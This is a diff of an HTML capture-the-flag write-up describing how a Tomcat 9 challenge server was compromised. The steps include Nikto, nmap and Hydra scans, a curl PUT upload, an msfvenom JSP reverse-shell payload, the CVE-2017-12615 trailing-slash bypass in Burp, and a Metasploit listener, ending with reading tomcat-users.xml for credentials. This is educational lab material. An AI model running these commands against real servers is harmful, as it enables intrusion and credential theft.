@@ -55,25 +55,25 @@
                 <div class="d-flex flex-column flex-md-row justify-content-between mb-5">
                     <div class="flex-grow-1">
                         <p>
-                            This challenge is asked to find the administrator password, our manager allows us to use any kind of method. So network scanning, brute force is allowed ;)<br>
-                            On the first page of the website, the content is only composed of images.
+                            This challenge is asked to find the administrator password, our manager allows us to use any kind of method. So network scanning and brute force is allowed ;)<br>
+                            Reaching the website, the content is only composed of images.
 
-                            <img src="img/WaltersBlog/webpage.png" class="img-fluid" width="700">
+                            <img src="img/WaltersBlog/webpage.PNG" class="img-fluid" width="700">
 
-                            At the bottom of the webpage, there is a "<i>Contact</i>" button, we are facing a form. However, it redirects me to an error page 404 and that means that the page requested is not found.
+                            At the bottom of the webpage, there is a "<i>Contact</i>" button, however, it redirects me to an error page 404 which means that the page requested is not found.
                             <img src="img/WaltersBlog/error404.png" class="img-fluid" width="400">
                             Even if we get into an error page, we still managed to retrieve some information about the web server behind this web application. That's a <strong>Apache Tomcat version 9.0.0.M1</strong>, it is important to remember the web server version, we might find some vulnerabilities that might be exploited. <br>
-                            <strong>Nikto</strong> is a tool that can be used to look for vulnerabilities on a web server. It will perform several tests including potential dangerous files and programs, check for outdated versions or others issues.
+                            <strong>Nikto</strong> is a tool that can be used to look for vulnerabilities on a web server. It will perform several tests including the check for potential dangerous files and programs as well as the check for outdated versions.
                             <img src="img/WaltersBlog/nikto.png" class="img-fluid" width="700">
                             After running <strong>Nikto</strong> on the website, it gives us several vulnerabilities that can be exploited. I can see that “/manager/html” and “/host-manager/html” are two administration pages. Reaching http://waltersblog3.chall.malicecyber.com/manager/html or http://waltersblog3.chall.malicecyber.com/host-manager/html, we are asked to enter the administrator credentials. <br>
-                            <br>Hydra is a tool used for login cracker. By selecting two files, one for the username and the other for the password, it can be automated to check if there is a valid user/password combination.
-                            <br>The metasploit-framework provide files containing the default admin user and admin password for tomcat manager, we can use those file and pass them as argument of the hydra command, to check if a user/password combination works on the administration login page.
+                            <br><strong>Hydra</strong> is a tool used for login cracker. By selecting two files, one for the username and the other for the password, it can be automated to check if there is a valid username/password combination.
+                            <br>The metasploit-framework provide files containing the default admin username and admin password for tomcat manager. We can use those files and pass them as arguments of the hydra command, and check if a username/password combination works on the administration login page.
                             <img src="img/WaltersBlog/hydra.png" class="img-fluid" width="600">
                             Too bad, there isn't any valid username/password combination. <br>
                             Let's see what we can find when we're scanning the IP address with <strong>nmap</strong>.
                             <img src="img/WaltersBlog/nmap.png" class="img-fluid" width="600">
                             We see that the server is an Apache-coyote/1.1. Using the option -A means that it is also going to detect the version of the service and the operating system. <br>
-                            The webserver is running on a Sony Ericson using Linux 2.4.X 
+                            The webserver is running on a Sony Ericson using Linux 2.4.X. <br>
                             Nmap scan gives us a <strong>tcpwrapped</strong> result, meaning that there is a tcpwrapper and it is a host-based network access control program on Linux. Tcpwrapper is protecting the program using the port, it indicates that a service is available, but our system does not have the right to communicate with it. There aren't other information, simply web ports (80 and 443).
                             <br>
                             <br>Back to Nikto results, it is displaying a vulnerability from the web server allowing any visitor to upload files on the webserver using a PUT request.
@@ -83,25 +83,39 @@
                             <li>curl -v -T shell.php http://waltersblog3.chall.malicecyber.com</li>
                             </ul>
                             <img src="img/WaltersBlog/curlput.png" class="img-fluid" width="600">
-                            To make sure that the file is correctly in the web server, we can use “<i>wget</i>” to retrieve the file to see if it is present, but normally everything should be fine since we get the response code 201. HTTP 201 code means that the file has been successfully created.
+                            To make sure that the file is correctly in the web server, we can use “<i>wget</i>” to retrieve the file and see if it is present, but normally everything should be fine since we get the response code 201. HTTP 201 code means that the file has been successfully created.
                             <img src="img/WaltersBlog/wget.png" class="img-fluid" width="600">
-                            Since the command wget has downloaded the file we have uploaded, then we can be certain that the vulnerability about creating a PUT request exists. <br>
+                            Since the command wget has downloaded the file that we have uploaded, then we can be certain that the vulnerability about creating a PUT request exists. <br>
                             <br>Tomcat is based on java, and can run .jsp file, so let’s try to upload some .jsp file. JSP (Java server page) program is part of a Java web application, it will act like a PHP file, it is used to send a response back to the server in the form of a web page. <br>
                             So let's upload .jsp file on the webserver then run it to open a reverse shield. <br>
 
-                            Using Metasploit, we can create a payload to open a reverse shell when the process run on the webserver. We know that to run the file, we just have to go to the page and he will automatically run the .jsp file. 
+                            Using Metasploit, we can create a payload to open a reverse shell when the process is running on the webserver. We know that to run the file, we just have to go to the page and he will automatically run the .jsp file. <br>
+                            Let's use <strong>Msfvenom</strong> to create the malicious .jsp payload and then we'll upload the file on the webserver. <br>
                             <br><strong>Msfvenom -p java/jsp_shell_reverse_tcp LHOST=[Your public IP address] LPORT=[Port to received the payload] -f raw > shell.jsp</strong>
+
                             <img src="img/WaltersBlog/curlfail.png" class="img-fluid" width="600">
 
-                            The webserver responds with a 404 error code. There is security mechanism that protect from user to upload any .jsp file. <br>
-                            Fortunately, after making some researches, there is a Tomcat 7 vulnerability (CVE-2017-12615) that can bypass that security mechanism by adding a “/” after the file name. <br>
-                            <br>We can use “Burp” and its function “Repeater” to change the request sent to the webserver and to see if we get a correct response from the server on the right panel. Without the “/” you get a 404 HTTP code, meaning that the request has failed.
+                            The webserver responds with a 404 error code. There is a security mechanism that protect the webserver from a .jsp file upload. <br>
+                            Fortunately, after making some researches, a Tomcat 7 vulnerability (CVE-2017-12615) exists that can bypass this security mechanism by adding a “/” after the file name. <br>
+                            <br>We can use “Burp” and its function “Repeater” to change the request sent to the webserver and see if we get a correct response from the web server on the right panel. Without the “/” we had a 404 HTTP code, meaning that the request has failed. Let's copy paste the malicious .jsp code in Burp and add a "/" in the request destination ("shell.jsp/").
 
                             <img src="img/WaltersBlog/burp.png" class="img-fluid" width="600">
 
-                            And it works, we got return code 201, which means that the webserver doesn't return any error.
+                            It works, we got a return code 201, which means that the webserver doesn't return any error. <br>
+                            Once we have done that, the payload is on the website. And all it remains to do is to listen on the port and run the file on the system. <br>
 
+                            <strong><br>Sudo msfdb init & msfconsole start <br>
+                            msf > use exploit/multi/handler <br>
+                            msf exploit(handler)> set PAYLOAD java/jsp_shell_reverse_tcp <br>
+                            msf exploit(handler) > set LHOST 192.168.190.133  <br>
+                            msf exploit(handler) > set LPORT 4444  <br>
+                            msf exploit(handler) > exploit <br></strong>
 
+                            <br>If that does not work, you must check your firewall or router settings. Here is a <a href="">tutorial</a> to open and forward a port to a virtual machine.
+
+                            <img src="img/WaltersBlog/exploit.png" class="img-fluid" width="600">
+
+                            Finally we got the flag ! Now to find the administrator password when you penetrate the system, you can check for the configuration file <strong>conf/tomcat-users.xml</strong> which contains the user's credentials.
                         </p>
 
                     </div>
